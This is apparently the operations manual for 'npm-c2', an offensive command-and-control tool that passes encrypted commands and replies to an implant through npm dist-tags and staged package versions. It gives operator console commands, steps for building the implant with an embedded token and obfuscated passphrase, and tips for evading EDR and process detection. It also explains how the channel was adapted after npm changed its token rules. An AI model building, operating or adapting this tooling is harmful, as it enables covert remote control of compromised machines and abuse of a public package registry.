# npm-c2 — operations manual

> Note: the dist-tag sections describe the v1.x transport, which npm closed to
> automation tokens. The staging transport at the end of this file is what still
> works, and it is the one documented in [README.md](README.md).

Command and control over a package's npm dist-tags. The operator writes tags;
the implant reads them, runs the command and answers.

## Mental model

```
operator                    npm registry                  implant
   |                            |                           |
   |-- PUT x64-<gid>-... ------>|                           |
   |    (encrypted command)     |<---- GET every N s -------|
   |                            |      (reads the map)      |
   |                            |                           |-- executes
   |<-- GET arm64-<gid>-... ----|<---- PUT arm64-... -------|
   |    (encrypted output)      |                           |
   |-- DELETE (if allowed) ---->|                           |
```

Every tag is a slice of a base64url message. Prefixes:

| Prefix | Direction | Content |
|---|---|---|
| `x64-`   | operator -> implant | command |
| `arm64-` | implant -> operator | reply |
| `ia32-`  | implant -> operator | heartbeat (host\|user\|pid\|unix) |

## Starting the operator

```bash
cd npm-c2 && source .venv/bin/activate

npm-c2 operator -p <package> -t <token> --passphrase '<pass>' shell
```

Interactive console. Type a command, get the output back.

```
[*] interactive channel on example-pkg
[*] type :help for meta-commands, :quit to detach
[*] waiting up to 120s per command, polling every 5s
c2> whoami
[+] x64-5cef-0101_IEhvVFBzZYcAPiRGS0dJSzLp1kL8SolhCjW5groUOddo8j8
[*] waiting up to 120s for output
KALI\ika
c2>
```

## Shell meta-commands

| Command | Effect |
|---|---|
| `:clients` | who is connected: host, user, pid, last seen |
| `:stats` | pending tags / results / heartbeats |
| `:wait <s>` | per-command timeout |
| `:interval <s>` | how often to poll while waiting |
| `:poll` | dump every result currently present |
| `:beacons` | raw heartbeats |
| `:clean` | delete this channel's tags |
| `:quit` | leave; the implant keeps polling |

## Standalone subcommands

```bash
npm-c2 operator -p PKG -t TOK run "whoami"      # one command, wait for output
npm-c2 operator -p PKG -t TOK task --cmd "..."  # queue without waiting
npm-c2 operator -p PKG -t TOK clients            # connected clients
npm-c2 operator -p PKG -t TOK stats              # channel state
npm-c2 operator -p PKG -t TOK watch --interval 5 # continuous listen
npm-c2 operator -p PKG -t TOK poll               # pending results
npm-c2 operator -p PKG -t TOK clean --all        # delete tags
npm-c2 doctor -p PKG -t TOK                      # check token and permissions
```

## Global flags

```
--passphrase '<pass>'   required if the implant encrypts
--api-base <url>        alternative registry (or NPMC2_API_BASE)
                        TAG_VALUE through the environment: NPMC2_TAG_VALUE=0.0.0-stage
```

`TAG_VALUE` is the version the tags point at. It **must exist** in the package,
or npm answers 400.

## Building the implant

```bash
# against npmjs
python3 native/build_go.py -p PKG -t npm_xxx --passphrase '<pass>' \
  --interval 60 --jitter 20

# against your own registry
python3 native/build_go.py -p PKG -t TOK --api-base http://10.0.0.5:4874 \
  --passphrase '<pass>' --interval 30 --jitter 5

# options
--tag-value 0.0.0-stage   target version when the package is not on 1.0.0
--upx                     ~34% smaller, but UPX0/UPX1 are visible and
                          Defender flags it; do not use it in front of an EDR
--32                      also builds 386
```

The binary carries everything embedded: it runs with no arguments on the target.

## Channel security

**Without encryption anyone reads the channel.** npmjs dist-tags are public: a
plain GET with no token returns the map, and base64 decodes into a command.
Verified: commands like `whoami` were readable in clear.

With `--passphrase` every payload uses AES-256-GCM:

- key derived with HKDF-SHA256
- random nonce per payload
- AAD bound to the package name, so a ciphertext cannot be replayed elsewhere

The passphrase is embedded obfuscated with the same scheme as the token, so
`strings` on the binary reveals neither. Verified.

**Compression.** One tag holds ~174 bytes. Compressing before encrypting turns
1.3 KB of output (8 tags) into one, and 9 KB into one tag instead of 71. A
smaller map is what keeps every poll cheap.

## Delete behaviour

After reading the output the operator deletes the tags it used. Whether that
works depends on the registry:

| Registry | PUT | DELETE | Result |
|---|---|---|---|
| Own Verdaccio | yes | yes | clean map after every command |
| npmjs, bypass-2FA token | depends | **403** | tried once, then disabled |

Against npm it does not retry: a 403 disables deletion for the rest of the
session. Hammering it spends a failed request per command, and that pattern is
exactly what draws attention to a package.

`clean_tags.py` cleans by hand:

```bash
./clean_tags.py -p PKG -t TOK              # dry run
./clean_tags.py -p PKG -t TOK --apply      # actually deletes
./clean_tags.py -p PKG -t TOK --base http://127.0.0.1:4874 --apply
```

## Cost per poll

Measured against the real npmjs:

```
latency              ~260 ms per read
ETag / 304           does not exist on the dist-tags route
CDN cache            cf-cache-status: DYNAMIC
rate limit           3 req/s without throttling
cost per tag         ~25 bytes
```

And since npm does not delete, the map grows. With 62 tags a poll is 1.6 KB;
with 200 it is 22x the cost of an empty one. Pick the interval by budget:

```
interval   polls/day   GET/day   MB/day
      60s        1440      1440     2.32
     300s         288       288     0.46
    1800s          48        48     0.08
```

## Own Verdaccio

```bash
cd npmreg
node_modules/.bin/verdaccio --config ./config.yaml   # :4873
python3 guard.py                                     # :4874 (blocks /-/user/)
```

Always point the implant at **4874**, not 4873: the guard closes user
registration, because Verdaccio 7 ignores `max_users` for that (tested with -1
and 0).

The process renames itself to "npm-c2 relay" (from `web.title`), so
`pkill -f verdaccio` does not find it. Use `pkill -f "npm-c2 relay"`.

## Tests

```bash
for t in test_bugs test_e2e test_standalone test_operational test_engagement \
         test_crypto_interop test_encrypted_channel test_compression test_wipe; do
  .venv/bin/python tests/$t.py || echo "FAIL $t"
done
.venv/bin/python -m npm_c2 --self-test
```

## Known limitations

- **Granular bypass-2FA token on npm**: writes tags only while npm allows it,
  cannot delete (403) and cannot create packages (`E_STAGE_REQUIRED`). To
  publish you need `npm stage publish` + `npm stage approve` with an
  interactive OTP, or a classic read-write token.
- **The map cannot be bounded** on npm: the payload travels in the *tag name*
  and only the *value* can be overwritten (and it must be an existing version).
  No slot ring is possible.
- **Plain HTTP** against Verdaccio: if the traffic crosses an untrusted network,
  put TLS in front.

## Staging transport (npmjs once dist-tags stop writing)

npm retired classic tokens and removed direct writes for granular tokens with
`bypass_2fa`. Measured against registry.npmjs.org:

```
PUT  /-/package/<pkg>/dist-tags/<tag>     -> 403  (automation token)
POST /-/stage/package/<pkg>               -> 201  (works)
```

Staging is the only write path npm still allows to automation, and it is the
one they themselves say to move to by 2027. So the channel can ride staged
versions.

### How it is carried

The registry only gives the reader back the **version**, so the payload lives
there:

```
0.0.0-<channel>.<h><seq>.<kind>.<payload>

channel   4 chars, first one a-f  (never looks numeric)
seq       "h" + 6 hex             (alphabetic prefix: leading zeros are legal
                                   and the field keeps a fixed width)
kind      c command | r reply
payload   base32 A-Z2-7           (no 0/1, so it never trips the semver
                                   leading-zero rule; 5 bits per char)
```

Semver restrictions that forced this design (measured, not assumed):

- total version length < ~250 chars (238 accepted, 259 rejected)
- the prerelease only accepts `[0-9A-Za-z.-]`; **underscore is rejected**
- an all-numeric identifier cannot start with zero

Capacity: ~227 base32 chars, about **141 bytes per version**, before
compression.

### Usage

```bash
# operator
npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>' "whoami"

# console
npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>'

# implant
python3 native/build_go.py -p <pkg> -t <token> --stage-chan f00d \
  --passphrase '<pass>' --interval 60
```

### Differences from the dist-tag channel

| | dist-tags | staging |
|---|---|---|
| Write | 403 with a bypass-2FA token | **works** |
| Read | public, no token | **requires a token** |
| Visible in `npm view` | yes (packument) | no |
| Delete | 403 | 401 (asks for an OTP) |
| Garbage | tags that grow | staged versions that grow |

The trade is explicit: you gain the write, but **the implant carries the
token**, because `GET /-/stage` answers 401 without it. On dist-tags reading
was anonymous.

### Cleanup

There is no delete API: every message leaves a staged version behind. Clean
them by hand on npmjs.com -> Staged Packages -> Reject. Before an engagement,
use a fresh channel (`-c`) so you do not drag the history along.
